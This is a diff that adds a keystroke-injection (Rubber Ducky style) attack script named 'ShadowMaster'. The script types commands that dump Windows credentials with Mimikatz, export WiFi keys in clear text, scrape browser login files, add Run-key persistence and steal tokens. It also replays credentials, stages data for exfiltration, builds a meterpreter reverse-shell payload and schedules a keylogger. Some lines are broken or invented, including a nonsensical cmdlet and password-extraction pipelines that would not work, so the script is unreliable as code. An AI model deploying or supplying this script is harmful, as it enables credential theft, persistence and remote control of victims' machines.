@@ -1,0 +1,80 @@
+REM Advanced Credential Harvesting
+GUI r
+DELAY 100
+STRING powershell -Command "Get-ChildItem -Path C:\Windows\System32\config\SAM"
+ENTER
+DELAY 500
+STRING powershell -Command "Invoke-Mimikatz -DumpCreds"
+ENTER
+
+REM WiFi Password Extraction
+GUI r
+DELAY 100
+STRING powershell -Command "netsh wlan show profiles"
+ENTER
+DELAY 500
+STRING powershell -Command "netsh wlan export profile folder=. key=clear"
+ENTER
+
+REM Browser Saved Passwords Extraction (Google Chrome)
+GUI r
+DELAY 100
+STRING powershell -Command "(Get-ChildItem 'C:\Users\$env:USERNAME\AppData\Local\Google\Chrome\User Data\Default/Login Data' | Select-String 'username' | ForEach-Object { $_.Matches.Value } ) > chrome_passwords.txt"
+ENTER
+
+REM Browser Saved Passwords Extraction (Mozilla Firefox)
+GUI r
+DELAY 100
+STRING powershell -Command "(Get-ChildItem 'C:\Users\$env:USERNAME\AppData\Roaming\Mozilla\Firefox\Profiles' | Select-String 'logins.json' | ForEach-Object { $_.Matches.Value } ) > firefox_passwords.txt"
+ENTER
+
+REM Persistence Mechanisms
+GUI r
+DELAY 100
+STRING reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ShadowMaster /t REG_SZ /d "C:\Path\To\ShadowMaster.exe" /f
+ENTER
+
+REM Privilege Escalation
+GUI r
+DELAY 100
+STRING powershell -Command "Get-HotFix | Where-Object {$_.Description -like '*KB*' } | Select-Object -ExpandProperty HotFixID"
+ENTER
+DELAY 500
+STRING powershell -Command "Invoke-TokenManipulation -StealToken"
+ENTER
+
+REM Lateral Movement Capabilities include automated credential replay; network share scanning; remote desktop session hijacking 
+GUI r 
+DELAY 100 
+STRING Invoke-CredentialReplay.ps1 –Credential (Get-Credential) –ComputerName <ComputerName>  
+ ENTER 
+
+REM Data Exfiltration capabilities include compression & encryption of exfiltrated data , DNS Tunneling as well as other alternative protocols 
+ GUI r  
+ DELAY 100   
+ STRING Compress-Archive –Path C:\Path\Folder –DestinationPath C:\Folder.zip   
+ ENTER  
+
+ REM Anti-Detection and Stealth Features include Signature Obfuscation ,Process Injection .    
+ GUI r       
+ DELAY 100          
+ STRING msfvenom.exe --payload windows/x64/meterpreter/reverse_tcp LHOST=<YourIP> LPORT=4444 --format raw > payload.bin        
+ ENTER             
+  
+ REM Comprehensive Reporting Features generate human-readable reports summarizing findings .      
+ GUI r                
+ DELAY 100                 
+ STRING echo "# Shadow Master Report" > report.txt              
+ ENTER                    
+ DELAY 500                     
+ STRING echo "" >> report.txt                
+ ENTER                       
+ STRING echo "" >> report.txt                 
+ ENTER                       
+  
+ REM Remote Access Features include Keylogging functionality .     
+ GUI r                      
+ DELAY 100                       
+ STRING Set-WmiInstanceClassNamespaceVariableInputActionActivateHorizonService -(New-TimeTrigger every week Friday Saturday Sunday) –action ./Keylogger.ps1            
+ ENTER                           
+  
